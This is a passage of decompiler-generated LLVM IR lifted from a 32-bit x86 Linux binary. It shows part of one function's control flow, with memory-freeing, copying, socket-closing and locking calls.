  %v0_80561bf = load i32, i32* @esp, align 4
  %v1_80561bf = add i32 %v0_80561bf, 27
  %v2_80561bf = inttoptr i32 %v1_80561bf to i8*
  store i8 0, i8* %v2_80561bf, align 1
  %v1_8056211.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056211

dec_label_pc_80561c6:                             ; preds = %dec_label_pc_8056125
  %v1_80561c9 = add i32 %v0_8056106, 132
  %v2_80561c9 = inttoptr i32 %v1_80561c9 to i32*
  %v3_80561c9 = load i32, i32* %v2_80561c9, align 4
  %v6_80561c9 = inttoptr i32 %v0_8056106 to i32*
  store i32 %v3_80561c9, i32* %v6_80561c9, align 4
  %v1_80561d0 = call i32 @free(i32 -1)
  store i32 %v1_80561d0, i32* %eax.global-to-local, align 4
  %v0_80561d5 = load i32, i32* @esp, align 4
  %v1_80561d5 = add i32 %v0_80561d5, 16
  %v1_80561d8 = add i32 %v0_80561d5, 260
  %v2_80561d8 = inttoptr i32 %v1_80561d8 to i32*
  %v3_80561d8 = load i32, i32* %v2_80561d8, align 4
  store i32 %v3_80561d8, i32* %eax.global-to-local, align 4
  %v1_80561df = add i32 %v0_80561d5, 136
  %v2_80561df = inttoptr i32 %v1_80561df to i32*
  %v3_80561df = load i32, i32* %v2_80561df, align 4
  %v15_80561df = icmp eq i32 %v3_80561df, %v3_80561d8
  %v1_80561e3 = icmp eq i1 %v15_80561df, false
  br i1 %v1_80561e3, label %dec_label_pc_8056211, label %dec_label_pc_80561e5

dec_label_pc_80561e5:                             ; preds = %dec_label_pc_80561c6
  %v0_80561e5 = load i32, i32* @edi, align 4
  %v1_80561e5 = add i32 %v0_80561e5, 16
  %v2_80561e5 = inttoptr i32 %v1_80561e5 to i32*
  %v3_80561e5 = load i32, i32* %v2_80561e5, align 4
  store i32 %v3_80561e5, i32* %eax.global-to-local, align 4
  %v2_80561e8 = add i32 %v0_80561d5, 148
  %v3_80561e8 = inttoptr i32 %v2_80561e8 to i32*
  %v4_80561e8 = load i32, i32* %v3_80561e8, align 4
  %v15_80561e8 = icmp eq i32 %v3_80561e5, %v4_80561e8
  %v1_80561ef = icmp eq i1 %v15_80561e8, false
  br i1 %v1_80561ef, label %dec_label_pc_80562ab, label %dec_label_pc_80561f5

dec_label_pc_80561f5:                             ; preds = %dec_label_pc_80561e5
  %v0_80561f5 = load i32, i32* @edx, align 4
  %v2_80561f5 = add i32 %v0_80561d5, 12
  %v3_80561f5 = inttoptr i32 %v2_80561f5 to i32*
  store i32 %v0_80561f5, i32* %v3_80561f5, align 4
  %v0_80561f6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80561f6 = add i32 %v0_80561d5, 8
  %v3_80561f6 = inttoptr i32 %v2_80561f6 to i32*
  store i32 %v0_80561f6, i32* %v3_80561f6, align 4
  %v1_80561f7 = add i32 %v0_80561d5, 152
  %v2_80561f7 = inttoptr i32 %v1_80561f7 to i32*
  %v3_80561f7 = load i32, i32* %v2_80561f7, align 4
  %v5_80561f7 = add i32 %v0_80561d5, 4
  %v6_80561f7 = inttoptr i32 %v5_80561f7 to i32*
  store i32 %v3_80561f7, i32* %v6_80561f7, align 4
  %v0_80561fe = load i32, i32* %eax.global-to-local, align 4
  %v1_80561fe = load i32, i32* @edi, align 4
  %v2_80561fe = add i32 %v1_80561fe, 36
  %v3_80561fe = inttoptr i32 %v2_80561fe to i32*
  %v4_80561fe = load i32, i32* %v3_80561fe, align 4
  %v7_80561fe = mul i32 %v4_80561fe, %v0_80561fe
  store i32 %v7_80561fe, i32* %eax.global-to-local, align 4
  %v2_8056202 = add i32 %v1_80561fe, 28
  %v3_8056202 = inttoptr i32 %v2_8056202 to i32*
  %v4_8056202 = load i32, i32* %v3_8056202, align 4
  %v5_8056202 = add i32 %v4_8056202, %v7_80561fe
  store i32 %v5_8056202, i32* %eax.global-to-local, align 4
  %v3_8056205 = inttoptr i32 %v0_80561d5 to i32*
  store i32 %v5_8056202, i32* %v3_8056205, align 4
  %v5_8056206 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8055d44, i32 %v3_8055da3)
  store i32 %v5_8056206, i32* %eax.global-to-local, align 4
  %v0_805620b = load i32, i32* @edi, align 4
  %v1_805620b = add i32 %v0_805620b, 36
  %v2_805620b = inttoptr i32 %v1_805620b to i32*
  %v3_805620b = load i32, i32* %v2_805620b, align 4
  %v4_805620b = add i32 %v3_805620b, 1
  store i32 %v4_805620b, i32* %v2_805620b, align 4
  br label %dec_label_pc_805620e

dec_label_pc_805620e:                             ; preds = %dec_label_pc_8056192, %dec_label_pc_80561f5
  %v0_805620e = load i32, i32* @esp, align 4
  %v1_805620e = add i32 %v0_805620e, 16
  br label %dec_label_pc_8056211

dec_label_pc_8056211:                             ; preds = %dec_label_pc_80561c6, %dec_label_pc_80561b8, %dec_label_pc_805620e
  %v1_8056211 = phi i32 [ %v1_80561d5, %dec_label_pc_80561c6 ], [ %v1_8056211.pre, %dec_label_pc_80561b8 ], [ %v1_805620e, %dec_label_pc_805620e ]
  %v0_8056211 = load i32, i32* @esi, align 4
  %v2_8056211 = add i32 %v1_8056211, 52
  %v3_8056211 = inttoptr i32 %v2_8056211 to i32*
  %v4_8056211 = load i32, i32* %v3_8056211, align 4
  %v5_8056211 = add i32 %v4_8056211, %v0_8056211
  store i32 %v5_8056211, i32* @esi, align 4
  %v0_8056215 = load i32, i32* @ebx, align 4
  %v1_8056215 = add i32 %v0_8056215, 1
  store i32 %v1_8056215, i32* @ebx, align 4
  %v2_8056216 = add i32 %v1_8056211, 104
  %v3_8056216 = inttoptr i32 %v2_8056216 to i32*
  %v4_8056216 = load i32, i32* %v3_8056216, align 4
  %v5_8056216 = sub i32 %v1_8056215, %v4_8056216
  %v11_8056216 = xor i32 %v4_8056216, %v1_8056215
  %v12_8056216 = xor i32 %v5_8056216, %v1_8056215
  %v13_8056216 = and i32 %v12_8056216, %v11_8056216
  %v14_8056216 = icmp slt i32 %v13_8056216, 0
  %v16_8056216 = icmp slt i32 %v5_8056216, 0
  %v2_805621a = icmp eq i1 %v16_8056216, %v14_8056216
  br i1 %v2_805621a, label %dec_label_pc_8056226, label %dec_label_pc_805621c

dec_label_pc_805621c:                             ; preds = %dec_label_pc_805621c.lr.ph, %dec_label_pc_8056211
  %v0_805621c = phi i32 [ %v0_805621c.pre, %dec_label_pc_805621c.lr.ph ], [ %v5_8056211, %dec_label_pc_8056211 ]
  %v0_80560f282 = phi i32 [ %v1_8056216.pre, %dec_label_pc_805621c.lr.ph ], [ %v1_8056211, %dec_label_pc_8056211 ]
  %v2_805621c = add i32 %v0_80560f282, 16
  %v3_805621c = inttoptr i32 %v2_805621c to i32*
  %v4_805621c = load i32, i32* %v3_805621c, align 4
  %v5_805621c = sub i32 %v0_805621c, %v4_805621c
  %v11_805621c = xor i32 %v4_805621c, %v0_805621c
  %v12_805621c = xor i32 %v5_805621c, %v0_805621c
  %v13_805621c = and i32 %v12_805621c, %v11_805621c
  %v14_805621c = icmp slt i32 %v13_805621c, 0
  %v16_805621c = icmp slt i32 %v5_805621c, 0
  %v2_8056220 = icmp eq i1 %v16_805621c, %v14_805621c
  br i1 %v2_8056220, label %dec_label_pc_8056226, label %dec_label_pc_80560f2

dec_label_pc_8056226:                             ; preds = %dec_label_pc_8056115, %dec_label_pc_80560e6, %dec_label_pc_8056211, %dec_label_pc_8056167, %dec_label_pc_805617b, %dec_label_pc_805621c, %dec_label_pc_805619e.dec_label_pc_8056226.loopexit_crit_edge
  %v0_8056226 = phi i32 [ %v0_8056226.pre.pre, %dec_label_pc_805619e.dec_label_pc_8056226.loopexit_crit_edge ], [ %v1_8056216.pre, %dec_label_pc_80560e6 ], [ %v1_8056211, %dec_label_pc_8056211 ], [ %v1_805615f, %dec_label_pc_8056167 ], [ %v1_805615f, %dec_label_pc_805617b ], [ %v0_80560f282, %dec_label_pc_805621c ], [ %v1_8056106, %dec_label_pc_8056115 ]
  %v1_8056229 = add i32 %v0_8056226, 20
  %v2_8056229 = inttoptr i32 %v1_8056229 to i32*
  %v3_8056229 = load i32, i32* %v2_8056229, align 4
  %v5_8056229 = add i32 %v0_8056226, -16
  %v6_8056229 = inttoptr i32 %v5_8056229 to i32*
  store i32 %v3_8056229, i32* %v6_8056229, align 4
  %v1_805622d = call i32 @__libc_close(i32 -1)
  store i32 %v1_805622d, i32* %eax.global-to-local, align 4
  %v0_8056232 = load i32, i32* @esp, align 4
  %v1_8056235 = add i32 %v0_8056232, 272
  %v2_8056235 = inttoptr i32 %v1_8056235 to i32*
  %v3_8056235 = load i32, i32* %v2_8056235, align 4
  %v4_8056235 = icmp eq i32 %v3_8056235, 0
  br i1 %v4_8056235, label %dec_label_pc_805624a, label %dec_label_pc_805623f

dec_label_pc_805623f:                             ; preds = %dec_label_pc_8056226
  store i32 %v3_8056235, i32* %edx.global-to-local, align 4
  %v2_8056246 = inttoptr i32 %v3_8056235 to i32*
  store i32 %v2_8055cb6, i32* %v2_8056246, align 4
  %v0_8056256.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056256

dec_label_pc_805624a:                             ; preds = %dec_label_pc_8056226
  %v3_805624d = inttoptr i32 %v0_8056232 to i32*
  store i32 %v2_8055cb6, i32* %v3_805624d, align 4
  %v1_805624e = call i32 @free(i32 -1)
  store i32 %v1_805624e, i32* %eax.global-to-local, align 4
  %v0_8056253 = load i32, i32* @esp, align 4
  %v1_8056253 = add i32 %v0_8056253, 16
  br label %dec_label_pc_8056256

dec_label_pc_8056256:                             ; preds = %dec_label_pc_805623f, %dec_label_pc_805624a
  %v0_8056256 = phi i32 [ %v0_8056256.pre, %dec_label_pc_805623f ], [ %v1_8056253, %dec_label_pc_805624a ]
  %v1_8056259 = add i32 %v0_8056256, 12
  %v2_8056259 = inttoptr i32 %v1_8056259 to i32*
  %v3_8056259 = load i32, i32* %v2_8056259, align 4
  %v5_8056259 = add i32 %v0_8056256, -16
  %v6_8056259 = inttoptr i32 %v5_8056259 to i32*
  store i32 %v3_8056259, i32* %v6_8056259, align 4
  %v1_805625d = call i32 @free(i32 -1)
  store i32 %v1_805625d, i32* @eax, align 4
  %v0_8056262 = load i32, i32* @esp, align 4
  %v1_8056265 = add i32 %v0_8056262, 8
  %v2_8056265 = inttoptr i32 %v1_8056265 to i32*
  store i32 ptrtoint (i8** @global_var_80636e8.580 to i32), i32* %v2_8056265, align 4
  %v1_805626a = add i32 %v0_8056262, 4
  %v2_805626a = inttoptr i32 %v1_805626a to i32*
  store i32 134564459, i32* %v2_805626a, align 4
  %v1_805626f = add i32 %v0_8056262, 200
  store i32 %v1_805626f, i32* %ebx.global-to-local, align 4
  %v3_8056276 = inttoptr i32 %v0_8056262 to i32*
  store i32 %v1_805626f, i32* %v3_8056276, align 4
  %v2_8056277 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d44)
  store i32 %v2_8056277, i32* %eax.global-to-local, align 4
  %v0_805627c = load i32, i32* @esp, align 4
  %v1_805627c = inttoptr i32 %v0_805627c to i32*
  store i32 ptrtoint (i8** @global_var_80636e8.580 to i32), i32* %v1_805627c, align 4
  %v1_8056283 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056283, i32* %eax.global-to-local, align 4
  %v0_8056288 = load i32, i32* @esp, align 4
  %v1_8056288 = add i32 %v0_8056288, 56
  %v2_8056288 = inttoptr i32 %v1_8056288 to i32*
  %v3_8056288 = load i32, i32* %v2_8056288, align 4
  store i32 %v3_8056288, i32* @eax, align 4
  %v1_805628c = add i32 %v0_8056288, 72
  %v2_805628c = inttoptr i32 %v1_805628c to i32*
  %v3_805628c = load i32, i32* %v2_805628c, align 4
  store i32 %v3_805628c, i32* %edx.global-to-local, align 4
  %v1_8056290 = inttoptr i32 %v0_8056288 to i32*
  %v3_8056290 = add i32 %v0_8056288, 4
  %v1_8056291 = inttoptr i32 %v3_8056290 to i32*
  store i32 1, i32* %v1_8056291, align 4
  %v0_8056294 = load i32, i32* @eax, align 4
  %v1_8056294 = sext i32 %v0_8056294 to i64
  store i64 %v1_8056294, i64* @global_var_8063700.581, align 256
  %v0_8056299 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056299 = trunc i32 %v0_8056299 to i16
  store i16 %v1_8056299, i16* @global_var_805d444.582, align 4
  %v0_80562a0 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80562a0, i32* %v1_8056290, align 4
  %v2_80562a1 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d44)
  store i32 %v2_80562a1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80563e2

dec_label_pc_80562ab:                             ; preds = %dec_label_pc_80561e5
  %v1_80562ae = inttoptr i32 %v0_80561e5 to i32*
  %v2_80562ae = load i32, i32* %v1_80562ae, align 4
  %v5_80562ae = inttoptr i32 %v0_80561d5 to i32*
  store i32 %v2_80562ae, i32* %v5_80562ae, align 4
  %v1_80562b0 = call i32 @free(i32 -1)
  store i32 %v1_80562b0, i32* @eax, align 4
  %v0_80562b5 = load i32, i32* @esp, align 4
  %v1_80562b5 = add i32 %v0_80562b5, 16
  br label %dec_label_pc_80562b8

dec_label_pc_80562b8:                             ; preds = %dec_label_pc_8055fea, %dec_label_pc_8056115, %dec_label_pc_805610d, %dec_label_pc_80560a9, %dec_label_pc_805602f, %dec_label_pc_805600b, %dec_label_pc_80562ab
  %v1_80562bf = phi i32 [ %v1_8055fff, %dec_label_pc_8055fea ], [ %v1_8056106, %dec_label_pc_8056115 ], [ %v1_8056106, %dec_label_pc_805610d ], [ %v1_8056020, %dec_label_pc_80560a9 ], [ %v1_8056020, %dec_label_pc_805602f ], [ %v1_8056020, %dec_label_pc_805600b ], [ %v1_80562b5, %dec_label_pc_80562ab ]
  %v1_80562b8 = add i32 %v1_80562bf, 51
  %v2_80562b8 = inttoptr i32 %v1_80562b8 to i8*
  %v3_80562b8 = load i8, i8* %v2_80562b8, align 1
  %v4_80562b8 = icmp eq i8 %v3_80562b8, 0
  %v1_80562bd = icmp eq i1 %v4_80562b8, false
  br i1 %v1_80562bd, label %dec_label_pc_8056303, label %dec_label_pc_80562bf

dec_label_pc_80562bf:                             ; preds = %dec_label_pc_80562b8
  %v0_80562bf = load i32, i32* @ecx, align 4
  %v2_80562bf = add i32 %v1_80562bf, -4
  %v3_80562bf = inttoptr i32 %v2_80562bf to i32*
  store i32 %v0_80562bf, i32* %v3_80562bf, align 4
  %v1_80562c0 = add i32 %v1_80562bf, -8
  %v2_80562c0 = inttoptr i32 %v1_80562c0 to i32*
  store i32 ptrtoint (i32* @global_var_805d448.518 to i32), i32* %v2_80562c0, align 4
  %v1_80562c5 = add i32 %v1_80562bf, -12
  %v2_80562c5 = inttoptr i32 %v1_80562c5 to i32*
  store i32 134564459, i32* %v2_80562c5, align 4
  %v1_80562ca = add i32 %v1_80562bf, 184
  store i32 %v1_80562ca, i32* @esi, align 4
  %v2_80562d1 = add i32 %v1_80562bf, -16
  %v3_80562d1 = inttoptr i32 %v2_80562d1 to i32*
  store i32 %v1_80562ca, i32* %v3_80562d1, align 4
  %v2_80562d2 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d44)
  store i32 %v2_80562d2, i32* %eax.global-to-local, align 4
  %v0_80562d7 = load i32, i32* @esp, align 4
  %v1_80562d7 = inttoptr i32 %v0_80562d7 to i32*
  store i32 ptrtoint (i32* @global_var_805d448.518 to i32), i32* %v1_80562d7, align 4
  %v1_80562de = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80562de, i32* %eax.global-to-local, align 4
  %v0_80562e3 = load i32, i32* @esp, align 4
  %v1_80562e3 = inttoptr i32 %v0_80562e3 to i32*
  %v2_80562e3 = load i32, i32* %v1_80562e3, align 4
  store i32 %v2_80562e3, i32* @eax, align 4
  %v3_80562e3 = add i32 %v0_80562e3, 4
  %v1_80562e4 = inttoptr i32 %v3_80562e3 to i32*
  %v2_80562e4 = load i32, i32* %v1_80562e4, align 4
  store i32 %v2_80562e4, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_80562e4, align 4
  %v0_80562e7 = load i32, i32* @esi, align 4
  store i32 %v0_80562e7, i32* %v1_80562e3, align 4
  %v0_80562e8 = load i32, i32* @global_var_8063b38.583, align 8
  store i32 %v0_80562e8, i32* %ebx.global-to-local, align 4
  %v2_80562ee = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d44)
  store i32 %v2_80562ee, i32* %eax.global-to-local, align 4
  %v0_80562f3 = load i32, i32* @esp, align 4
  %v1_80562f3 = add i32 %v0_80562f3, 16
  %v1_80562f6 = add i32 %v0_80562e8, -1
  store i32 %v1_80562f6, i32* @ebx, align 4
  %v1_80562f7 = add i32 %v0_80562f3, 52
  %v2_80562f7 = inttoptr i32 %v1_80562f7 to i32*
  %v3_80562f7 = load i32, i32* %v2_80562f7, align 4
  %v5_80562f7 = sub i32 %v3_80562f7, %v1_80562f6
  %v11_80562f7 = xor i32 %v3_80562f7, %v1_80562f6
  %v12_80562f7 = xor i32 %v5_80562f7, %v3_80562f7
  %v13_80562f7 = and i32 %v12_80562f7, %v11_80562f7
  %v14_80562f7 = icmp slt i32 %v13_80562f7, 0
  %v16_80562f7 = icmp slt i32 %v5_80562f7, 0
  %v2_80562fb = icmp eq i1 %v16_80562f7, %v14_80562f7
  br i1 %v2_80562fb, label %dec_label_pc_8056303, label %dec_label_pc_80562fd

dec_label_pc_80562fd:                             ; preds = %dec_label_pc_80562bf
  %v4_80562fd = add i32 %v3_80562f7, 1
  store i32 %v4_80562fd, i32* %v2_80562f7, align 4
  br label %dec_label_pc_8056324.backedge

dec_label_pc_8056303:                             ; preds = %dec_label_pc_8055f8c, %dec_label_pc_80562bf, %dec_label_pc_80562b8, %dec_label_pc_8055fa3
  %v1_8056310 = phi i32 [ %v1_80562f3, %dec_label_pc_80562bf ], [ %v1_80562bf, %dec_label_pc_80562b8 ], [ %v1_8055fdf, %dec_label_pc_8055fa3 ], [ %v0_8056303.pre, %dec_label_pc_8055f8c ]
  %v1_8056303 = add i32 %v1_8056310, 40
  %v2_8056303 = inttoptr i32 %v1_8056303 to i32*
  %v3_8056303 = load i32, i32* %v2_8056303, align 4
  %v1_8056307 = add i32 %v3_8056303, 1
  store i32 %v1_8056307, i32* %eax.global-to-local, align 4
  %v1_8056308 = ashr i32 %v1_8056307, 31
  store i32 %v1_8056308, i32* %edx.global-to-local, align 4
  %v1_8056309 = add i32 %v1_8056310, 248
  %v2_8056309 = inttoptr i32 %v1_8056309 to i32*
  %v3_8056309 = load i32, i32* %v2_8056309, align 4
  %v5_8056309 = zext i32 %v1_8056307 to i64
  %v7_8056309 = zext i32 %v1_8056308 to i64
  %v8_8056309 = mul nuw i64 %v7_8056309, 4294967296
  %v9_8056309 = or i64 %v8_8056309, %v5_8056309
  %v10_8056309 = zext i32 %v3_8056309 to i64
  %v11_8056309 = sdiv i64 %v9_8056309, %v10_8056309
  %v12_8056309 = trunc i64 %v11_8056309 to i32
  store i32 %v12_8056309, i32* %eax.global-to-local, align 4
  %v13_8056309 = srem i64 %v9_8056309, %v10_8056309
  %v14_8056309 = trunc i64 %v13_8056309 to i32
  store i32 %v14_8056309, i32* %edx.global-to-local, align 4
  store i32 %v14_8056309, i32* %v2_8056303, align 4
  %v1_8056314 = icmp eq i32 %v14_8056309, 0
  %v1_8056316 = icmp eq i1 %v1_8056314, false
  br i1 %v1_8056316, label %dec_label_pc_805631c, label %dec_label_pc_8056318

dec_label_pc_8056318:                             ; preds = %dec_label_pc_8056303
  %v0_8056318 = load i32, i32* @esp, align 4
  %v1_8056318 = add i32 %v0_8056318, 28
  %v2_8056318 = inttoptr i32 %v1_8056318 to i32*
  %v3_8056318 = load i32, i32* %v2_8056318, align 4
  %v4_8056318 = add i32 %v3_8056318, 1
  store i32 %v4_8056318, i32* %v2_8056318, align 4
  br label %dec_label_pc_805631c

dec_label_pc_805631c:                             ; preds = %dec_label_pc_8056303, %dec_label_pc_8056318
  %v0_805631c = load i32, i32* @esp, align 4
  %v1_805631c = add i32 %v0_805631c, 36
  %v2_805631c = inttoptr i32 %v1_805631c to i32*
  store i32 -1, i32* %v2_805631c, align 4
  br label %dec_label_pc_8056324.backedge

dec_label_pc_8056324.backedge:                    ; preds = %dec_label_pc_805631c, %dec_label_pc_8055f9a, %dec_label_pc_8056088, %dec_label_pc_80562fd
  %v0_8056324.pre = load i32, i32* @esp, align 4
  %v1_8056324 = add i32 %v0_8056324.pre, 28
  %v2_8056324 = inttoptr i32 %v1_8056324 to i32*
  %v3_8056324 = load i32, i32* %v2_8056324, align 4
  %tmp121 = icmp ult i32 %v3_8056324, 3
  br i1 %tmp121, label %dec_label_pc_8055d84, label %dec_label_pc_8056349

dec_label_pc_8056349:                             ; preds = %dec_label_pc_8055cfe, %dec_label_pc_8055d9a, %dec_label_pc_8055e8e, %dec_label_pc_8056324.backedge, %entry, %dec_label_pc_8055cd8, %dec_label_pc_8055ce0, %dec_label_pc_8055cee
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_8055cee ], [ -1, %dec_label_pc_8055ce0 ], [ -1, %dec_label_pc_8055cd8 ], [ -1, %entry ], [ %v0_8055d4b, %dec_label_pc_8056324.backedge ], [ %v0_8055d4b, %dec_label_pc_8055e8e ], [ %v0_8055d4b, %dec_label_pc_8055d9a ], [ %v0_8055d4b, %dec_label_pc_8055cfe ]
  %v0_8056349 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056349, i32* %eax.global-to-local, align 4
  %v1_805634e = inttoptr i32 %v0_8056349 to i32*
  store i32 -1, i32* %v1_805634e, align 4
  %v0_8056354 = load i32, i32* @esp, align 4
  %v1_8056354 = add i32 %v0_8056354, 44
  %v2_8056354 = inttoptr i32 %v1_8056354 to i32*
  %v3_8056354 = load i32, i32* %v2_8056354, align 4
  store i32 %v3_8056354, i32* %eax.global-to-local, align 4
  %v2_8056358 = add i32 %v0_8056354, 56
  %v3_8056358 = inttoptr i32 %v2_8056358 to i32*
  store i32 %v3_8056354, i32* %v3_8056358, align 4
  br label %dec_label_pc_805635c

dec_label_pc_805635c:                             ; preds = %dec_label_pc_80560c1, %dec_label_pc_8056099, %dec_label_pc_8056349
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8056349 ], [ %v0_8055d4b, %dec_label_pc_80560c1 ], [ %v0_8055d4b, %dec_label_pc_8056099 ]
  %v0_805635c = load i32, i32* @esp, align 4
  %v1_805635c = add i32 %v0_805635c, 20
  %v2_805635c = inttoptr i32 %v1_805635c to i32*
  %v3_805635c = load i32, i32* %v2_805635c, align 4
  %v13_805635c = icmp eq i32 %v3_805635c, -1
  br i1 %v13_805635c, label %dec_label_pc_805635c.dec_label_pc_8056372_crit_edge, label %dec_label_pc_8056363

dec_label_pc_805635c.dec_label_pc_8056372_crit_edge: ; preds = %dec_label_pc_805635c
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_8056372

dec_label_pc_8056363:                             ; preds = %dec_label_pc_805635c
  %v3_8056366 = load i32, i32* %v2_805635c, align 4
  %v5_8056366 = add i32 %v0_805635c, -16
  %v6_8056366 = inttoptr i32 %v5_8056366 to i32*
  store i32 %v3_8056366, i32* %v6_8056366, align 4
  %v1_805636a = sext i16 %stack_var_-192.1 to i32
  %v2_805636a = call i32 @__libc_close(i32 %v1_805636a)
  store i32 %v2_805636a, i32* %eax.global-to-local, align 4
  %v0_805636f = load i32, i32* @esp, align 4
  %v1_805636f = add i32 %v0_805636f, 16
  br label %dec_label_pc_8056372

dec_label_pc_8056372:                             ; preds = %dec_label_pc_805635c.dec_label_pc_8056372_crit_edge, %dec_label_pc_8056363
  %v1_8056379.pre-phi = phi i32 [ %.pre, %dec_label_pc_805635c.dec_label_pc_8056372_crit_edge ], [ %v1_805636a, %dec_label_pc_8056363 ]
  %v0_8056372 = phi i32 [ %v0_805635c, %dec_label_pc_805635c.dec_label_pc_8056372_crit_edge ], [ %v1_805636f, %dec_label_pc_8056363 ]
  %v1_8056375 = add i32 %v0_8056372, 12
  %v2_8056375 = inttoptr i32 %v1_8056375 to i32*
  %v3_8056375 = load i32, i32* %v2_8056375, align 4
  %v5_8056375 = add i32 %v0_8056372, -16
  %v6_8056375 = inttoptr i32 %v5_8056375 to i32*
  store i32 %v3_8056375, i32* %v6_8056375, align 4
  %v2_8056379 = call i32 @free(i32 %v1_8056379.pre-phi)
  store i32 %v2_8056379, i32* %eax.global-to-local, align 4
  %v1_805637e = load i32, i32* @esp, align 4
  %v2_805637e = inttoptr i32 %v1_805637e to i32*
  store i32 %v2_8055cb6, i32* %v2_805637e, align 4
  %v2_8056381 = call i32 @free(i32 %v1_8056379.pre-phi)
  store i32 %v2_8056381, i32* @eax, align 4
  %v0_8056386 = load i32, i32* @esp, align 4
  %v1_8056389 = add i32 %v0_8056386, 32
  %v2_8056389 = inttoptr i32 %v1_8056389 to i32*
  store i32 -1, i32* %v2_8056389, align 4
  %v0_8056391 = load i32, i32* @esp, align 4
  %v1_8056391 = add i32 %v0_8056391, 40
  %v2_8056391 = inttoptr i32 %v1_8056391 to i32*
  %v3_8056391 = load i32, i32* %v2_8056391, align 4
  %v13_8056391 = icmp eq i32 %v3_8056391, -1
  br i1 %v13_8056391, label %dec_label_pc_80563e5, label %dec_label_pc_8056398

dec_label_pc_8056398:                             ; preds = %dec_label_pc_8056372
  %v0_8056398 = load i32, i32* @ecx, align 4
  %v2_8056398 = add i32 %v0_8056391, -4
  %v3_8056398 = inttoptr i32 %v2_8056398 to i32*
  store i32 %v0_8056398, i32* %v3_8056398, align 4
  %v1_8056399 = add i32 %v0_8056391, -8
  %v2_8056399 = inttoptr i32 %v1_8056399 to i32*
  store i32 ptrtoint (i8** @global_var_80636e8.580 to i32), i32* %v2_8056399, align 4
  %v1_805639e = add i32 %v0_8056391, -12
  %v2_805639e = inttoptr i32 %v1_805639e to i32*
  store i32 134564459, i32* %v2_805639e, align 4
  %v1_80563a3 = add i32 %v0_8056391, 184
  store i32 %v1_80563a3, i32* %ebx.global-to-local, align 4
  %v2_80563aa = add i32 %v0_8056391, -16
  %v3_80563aa = inttoptr i32 %v2_80563aa to i32*
  store i32 %v1_80563a3, i32* %v3_80563aa, align 4
  %v3_80563ab = call i32 @__pthread_return_void(i32 %v1_8056379.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80563ab, i32* %eax.global-to-local, align 4
  %v0_80563b0 = load i32, i32* @esp, align 4
  %v1_80563b0 = inttoptr i32 %v0_80563b0 to i32*
  store i32 ptrtoint (i8** @global_var_80636e8.580 to i32), i32* %v1_80563b0, align 4
  %v2_80563b7 = call i32 @__pthread_return_0(i32 %v1_8056379.pre-phi)
  store i32 %v2_80563b7, i32* %eax.global-to-local, align 4
  %v0_80563bc = load i32, i32* @esp, align 4
  %v1_80563bc = add i32 %v0_80563bc, 56
  %v2_80563bc = inttoptr i32 %v1_80563bc to i32*
  %v3_80563bc = load i32, i32* %v2_80563bc, align 4
  store i32 %v3_80563bc, i32* %edx.global-to-local, align 4
  %v1_80563c0 = add i32 %v0_80563bc, 72
  %v2_80563c0 = inttoptr i32 %v1_80563c0 to i32*
  %v3_80563c0 = load i32, i32* %v2_80563c0, align 4
  store i32 %v3_80563c0, i32* %eax.global-to-local, align 4
  %v1_80563c4 = sext i32 %v3_80563bc to i64
  store i64 %v1_80563c4, i64* @global_var_8063700.581, align 256
  %v1_80563ca = trunc i32 %v3_80563c0 to i16
  store i16 %v1_80563ca, i16* @global_var_805d444.582, align 4
  %v1_80563d0 = inttoptr i32 %v0_80563bc to i32*
  %v2_80563d0 = load i32, i32* %v1_80563d0, align 4
  store i32 %v2_80563d0, i32* @eax, align 4
  %v3_80563d0 = add i32 %v0_80563bc, 4
  %v1_80563d1 = inttoptr i32 %v3_80563d0 to i32*
  %v2_80563d1 = load i32, i32* %v1_80563d1, align 4
  store i32 %v2_80563d1, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_80563d1, align 4
  %v0_80563d4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80563d4, i32* %v1_80563d0, align 4
  %v3_80563d5 = call i32 @__pthread_return_void(i32 %v1_8056379.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80563d5, i32* %eax.global-to-local, align 4
  %v0_80563da = load i32, i32* @esp, align 4
  %v1_80563da = add i32 %v0_80563da, 32
  %v2_80563da = inttoptr i32 %v1_80563da to i32*
  store i32 -1, i32* %v2_80563da, align 4
  br label %dec_label_pc_80563e2

dec_label_pc_80563e2:                             ; preds = %dec_label_pc_8056256, %dec_label_pc_8056398
  %v0_80563e2 = load i32, i32* @esp, align 4
  %v1_80563e2 = add i32 %v0_80563e2, 16
  br label %dec_label_pc_80563e5

dec_label_pc_80563e5:                             ; preds = %dec_label_pc_8056372, %dec_label_pc_80563e2
  %v0_80563e5 = phi i32 [ %v0_8056391, %dec_label_pc_8056372 ], [ %v1_80563e2, %dec_label_pc_80563e2 ]
  %v1_80563e5 = add i32 %v0_80563e5, 16
  %v2_80563e5 = inttoptr i32 %v1_80563e5 to i32*
  %v3_80563e5 = load i32, i32* %v2_80563e5, align 4
  store i32 %v3_80563e5, i32* %eax.global-to-local, align 4
  %v1_80563e9 = add i32 %v0_80563e5, 220
  %v1_80563ef = inttoptr i32 %v1_80563e9 to i32*
  %v2_80563ef = load i32, i32* %v1_80563ef, align 4
  store i32 %v2_80563ef, i32* @ebx, align 4
  %v3_80563ef = add i32 %v0_80563e5, 224
  %v1_80563f0 = inttoptr i32 %v3_80563ef to i32*
  %v2_80563f0 = load i32, i32* %v1_80563f0, align 4
  store i32 %v2_80563f0, i32* @esi, align 4
